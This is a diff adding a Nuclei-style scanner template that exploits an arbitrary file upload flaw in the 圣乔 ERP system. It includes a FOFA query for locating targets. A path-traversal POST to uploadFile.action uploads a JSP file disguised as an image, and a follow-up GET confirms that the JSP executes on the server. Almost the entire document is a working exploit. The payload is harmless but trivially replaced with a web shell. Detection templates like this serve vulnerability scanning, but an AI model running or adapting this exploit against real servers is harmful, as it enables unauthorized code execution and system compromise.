@@ -1,0 +1,55 @@
+id: poc-iwly9cdlghamwt21
+info:
+  name: 圣乔ERP系统uploadFile存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iwly9cdlghamwt21'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iwly9cdlghamwt21
+    fofa: app="圣乔-ERP系统"
+http:
+- raw:
+  - 'POST /erp/wap/../uploadFile.action HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 10338
+
+
+    -----------------------------45250802924973458471174811279
+
+    Content-Disposition: form-data; name="Filedata"; filename="123.jsp"
+
+    Content-Type: image/png
+
+
+    <%out.print(123456);%>
+
+    -----------------------------45250802924973458471174811279
+
+
+    上传定位：'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - GET /erp/wap/../FileStorageDirectorynull/123.jsp HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
